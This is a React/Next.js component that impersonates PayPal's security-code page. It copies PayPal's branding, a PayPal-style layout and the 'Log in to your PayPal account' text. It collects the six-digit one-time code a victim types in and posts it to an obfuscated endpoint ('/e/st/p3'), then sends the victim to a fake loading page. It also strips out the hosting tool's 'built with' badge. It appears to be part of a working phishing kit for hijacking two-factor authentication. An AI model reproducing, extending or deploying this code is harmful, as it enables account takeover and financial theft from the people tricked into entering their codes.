"use client"

import type React from "react"
import { useEffect, useRef, useState } from "react"
import { useRouter } from "next/navigation"
import { get_text } from "../as/X_31.tsx"

const OTP_LENGTH = 6

export default function Sms1Patched() {
  const router = useRouter()
  const [otpValues, setOtpValues] = useState<string[]>(Array.from({ length: OTP_LENGTH }, () => ""))
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  useEffect(() => {
    inputRefs.current[0]?.focus()

    // Persistent observer: keep removing the injected badge; disconnect only on unmount.
    const observer = new MutationObserver(() => {
      document.querySelectorAll('[id*="v0-built-with-button"]').forEach((el) => el.parentElement?.remove())
    })
    observer.observe(document.body, { childList: true, subtree: true })
    return () => observer.disconnect()
  }, [])

  function distributeDigits(start: number, digits: string) {
    const clean = digits.replace(/\D/g, "")
    if (!clean) return
    const next = [...otpValues]
    let i = start
    for (const ch of clean) {
      if (i >= OTP_LENGTH) break
      next[i] = ch
      i++
    }
    setOtpValues(next) // replace state immutably to avoid stale UI [^1][^2]
    inputRefs.current[Math.min(i, OTP_LENGTH - 1)]?.focus()
  }

  function handleInputChange(index: number, value: string) {
    const digits = value.replace(/\D/g, "")
    if (!digits) {
      const next = [...otpValues]
      next[index] = ""
      setOtpValues(next)
      return
    }
    if (digits.length > 1) {
      distributeDigits(index, digits.slice(0, OTP_LENGTH))
      return
    }
    const next = [...otpValues]
    next[index] = digits[0]
    setOtpValues(next)
    if (index < OTP_LENGTH - 1) inputRefs.current[index + 1]?.focus()
  }

  function handleKeyDown(index: number, e: React.KeyboardEvent<HTMLInputElement>) {
    if (e.key === "Backspace") {
      if (otpValues[index] === "" && index > 0) {
        const next = [...otpValues]
        next[index - 1] = ""
        setOtpValues(next)
        inputRefs.current[index - 1]?.focus()
      } else {
        const next = [...otpValues]
        next[index] = ""
        setOtpValues(next)
      }
    }
    if (e.key === "ArrowLeft" && index > 0) inputRefs.current[index - 1]?.focus()
    if (e.key === "ArrowRight" && index < OTP_LENGTH - 1) inputRefs.current[index + 1]?.focus()
  }

  function handleFocus(index: number) {
    // Select instead of clearing so earlier digits remain visible.
    inputRefs.current[index]?.select()
  }

  function handlePaste(index: number, e: React.ClipboardEvent<HTMLInputElement>) {
    e.preventDefault()
    distributeDigits(index, e.clipboardData.getData("text").slice(0, OTP_LENGTH))
  }

  async function handleSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault()
    const otpCode = otpValues.join("")
    if (otpCode.length !== OTP_LENGTH || otpValues.some((d) => d === "")) {
      alert("Please enter complete 6-digit code")
      return
    }

    if (typeof window !== "undefined") {
      sessionStorage.setItem("OTP", otpCode)
    }

    try {
      const formData = new FormData()
      otpValues.forEach((v, i) => formData.append(String(i + 1), v))
      formData.append("submitSecurityCode", "true")
      const response = await fetch("/e/st/p3", { method: "POST", body: formData })
      if (response.redirected) {
        router.push(response.url)
      } else {
        router.push("/as/loading2")
      }
    } catch (error) {
      console.error("OTP submission error:", error)
    }
  }

  return (
    <html lang="en">
      <head>
        <meta charSet="utf-8" />
        <title>OTP</title>
        <meta httpEquiv="content-type" content="text/html; charset=UTF-8" />
        <meta name="application-name" content="PayPal" />
        <link rel="shortcut icon" href="/as/img/momgram@2x.png" />
        <meta
          name="viewport"
          content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes"
        />
        <link rel="stylesheet" href="/as/css/contextualLoginElementalUI.css" />
        <link rel="stylesheet" href="/as/css/app.css" />
      </head>
      <body>
        <div>
          <section></section>
          <section id="login" className="login" data-role="page" data-title="Log in to your PayPal account">
            <div className="corral">
              <div id="content" className="contentContainer activeContent contentContainerBordered">
                <header>
                  <p
                    role="img"
                    aria-label="PayPal Logo"
                    className="paypal-logo paypal-logo-long signin-paypal-logo"
                  ></p>
                </header>

                <center>
                  <style jsx>{`
                    .textstyle {
                      color: #0c0c0d;
                      font-family: PayPalSansBig-Regular, Helvetica Neue, Arial, sans-serif;
                      font-size: 1.125rem;
                      line-height: 1.5rem;
                      font-weight: 400;
                    }
                    /* Match /as/sms OTP appearance */
                    .v0-otp-grid {
                      display: grid;
                      grid-template-columns: repeat(6, 56px);
                      gap: 14px;
                      justify-content: center;
                      align-items: center;
                    }
                    .v0-otp-input {
                      width: 56px;
                      height: 56px;
                      text-align: center;
                      font-size: 22px;
                      line-height: 56px;
                      border: 1.5px solid #e5e7eb;
                      border-radius: 10px;
                      outline: none;
                      color: #0b0b0c;
                      background: #fff;
                      caret-color: #2563eb;
                      font-variant-numeric: tabular-nums;
                      transition: box-shadow 120ms ease, border-color 120ms ease;
                    }
                    .v0-otp-input:focus {
                      border-color: #2563eb;
                      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.25);
                    }
                  `}</style>

                  <center>
                    <h1>
                      <strong>{get_text("top8")}</strong>
                    </h1>
                    <p className="textstyle">{get_text("top6")}</p>
                    <font color="#ff0000">{get_text("top10")}</font>
                  </center>

                  <br />

                  <form id="PageMainForm" method="post" className="top15" onSubmit={handleSubmit}>
                    <div>
                      <div className="codeInput">
                        <div className="ppvx_code-input___1-4-1 codeInput-wrapper" id="answer">
                          <div className="ppvx_code-input__input-wrapper___1-4-1 v0-otp-grid">
                            {[0, 1, 2, 3, 4, 5].map((index) => (
                              <div
                                key={index}
                                className="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1"
                              >
                                <input
                                  ref={(el) => (inputRefs.current[index] = el)}
                                  maxLength={1}
                                  name={`${index + 1}`}
                                  className="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp v0-otp-input"
                                  aria-label={`Digit ${index + 1}`}
                                  required
                                  type="tel"
                                  inputMode="numeric"
                                  pattern="[0-9]*"
                                  autoComplete="one-time-code"
                                  value={otpValues[index]}
                                  onChange={(e) => handleInputChange(index, e.target.value)}
                                  onKeyDown={(e) => handleKeyDown(index, e)}
                                  onFocus={() => handleFocus(index)}
                                  onPaste={(e) => handlePaste(index, e)}
                                />
                                <label
                                  htmlFor={`ci-answer-${index}`}
                                  id={`ci-answer-${index}-label`}
                                  className="ppvx_text-input__label___3-14-1 answerLabel data-nemo"
                                ></label>
                              </div>
                            ))}
                          </div>
                        </div>
                      </div>
                    </div>

                    <div className="action">
                      <button
                        className="ppvx_btn___5-11-8 ppvx--v2___5-11-8 scTrack:security_code_continue_button button"
                        type="submit"
                        id="securityCodeSubmit"
                        name="submitSecurityCode"
                        data-nemo="securityCodeSubmit"
                      >
                        {get_text("top9")}
                      </button>
                    </div>
                  </form>
                </center>

                <footer className="footer" role="contentinfo">
                  <div className="legalFooter">
                    <ul className="footerGroup">
                      <li>
                        <a target="_blank" href="#" rel="noreferrer">
                          {get_text("top13")}
                        </a>
                      </li>
                      <li>
                        <a target="_blank" href="#" rel="noreferrer">
                          {get_text("top14")}
                        </a>
                      </li>
                      <li>
                        <a target="_blank" href="#" rel="noreferrer">
                          {get_text("top15")}
                        </a>
                      </li>
                    </ul>
                  </div>
                </footer>
              </div>
            </div>
          </section>
        </div>
      </body>
    </html>
  )
}
